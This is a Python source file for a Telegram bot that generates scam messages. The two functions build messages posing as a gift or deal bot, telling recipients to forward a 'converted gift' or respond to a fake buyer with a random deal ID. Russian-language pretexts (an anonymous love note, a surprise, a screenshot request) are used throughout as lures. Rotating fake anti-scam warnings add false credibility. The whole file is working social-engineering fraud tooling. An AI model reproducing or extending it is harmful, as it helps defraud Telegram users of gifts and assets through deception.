import random

def get_als_text(msg, bot_username):
    text = getattr(msg, "text", "")
    parts = text.split(maxsplit=2)
    if len(parts) < 2 or not parts[1].startswith('@'):
        return "❌ Укажи username через @, пример: /als @user [комментарий]"

    target_username = parts[1].lstrip('@')
    user_comment = parts[2] if len(parts) > 2 else ""

    if user_comment:
        quote_text = user_comment.replace("@", f"@{target_username}")
    else:
        quote_text = (
            f'привет, можешь передать анонимное сообщение человеку @{target_username}? "люблю..."\n'
            f"после того как человек ответит  пришлёшь подарок, в боте увидишь подарок, просто человеку перешли и все, спасибо заранее, я из тт , в лс напишу тебе щас"
        )

    main_text = (
        f"@{bot_username} does not require verification or KYC, and never asks you to switch to third-party bots for any purpose. If you receive such a message, please be careful.\n\n"
        f"Вам был передан подарок, получатель @{target_username}, перешлите получателю, подарок сконвертирован, комментарий будет доступен после получения"
    )

    formatted = (
        f"<b>{main_text}</b>\n\n"
        f"<blockquote>{quote_text}</blockquote>"
    )
    return formatted

WARNING_TEXTS = [
    "does not require verification or KYC. Never follow third-party bots or links — it's not safe.",
    "will never ask for verification or redirect you to unknown bots. Stay cautious.",
    "doesn't ask you to confirm identity or interact with third-party services. Avoid scams.",
    "won't require personal info or switching to other bots. Be careful.",
    "doesn't use KYC or third-party tools. If you’re asked — it’s a scam.",
    "never asks for your data or to join other bots. Ignore such requests.",
    "won’t send verification requests or link you elsewhere. Stay alert.",
    "is secure and doesn’t use third-party verifications. Don't trust anyone claiming otherwise.",
    "never uses outside services or KYC. Don’t share info with unknown bots.",
    "won't ever redirect you to another bot or ask for ID. Be smart.",
    "operates fully inside Telegram and doesn't involve verification steps. Trust only inside actions.",
    "doesn't request KYC or use external bots. Don’t interact with suspicious messages.",
    "is safe to use without extra steps. Any KYC/redirect request is fake.",
    "has no verification process and doesn’t ask for anything outside. Be aware.",
    "is fully self-contained and safe. Do not click on unknown bot links."
]

def get_pyid_text(msg, bot_username):
    text = getattr(msg, "text", "")
    parts = text.split(maxsplit=2)
    if len(parts) < 2 or not parts[1].startswith('@'):
        return "❌ Укажи username через @, пример: /pyid @user [текст]"

    target_username = parts[1].lstrip('@')
    user_message = parts[2] if len(parts) > 2 else ""
    deal_id = f"#EV{random.randint(10000, 99999)}"
    warning_text = random.choice(WARNING_TEXTS)

    if user_message:
        message_body = user_message.replace('@', f'@{target_username}')
    else:
        message_body = (
            f"Пожалуйста отправь, @{target_username} ей и потом пришли скриншот когда она получит его и потом можешь кинуть ей мой юзер , просто это сюрприз должен быть ."
        )

    main_text = (
        f"<b>@{bot_username} {warning_text}</b>\n\n"
        f"<b>📩 Покупатель из сделки {deal_id}\nприслал Вам сообщение:</b>\n\n"
        f"<blockquote>{message_body}</blockquote>"
    )

    return main_text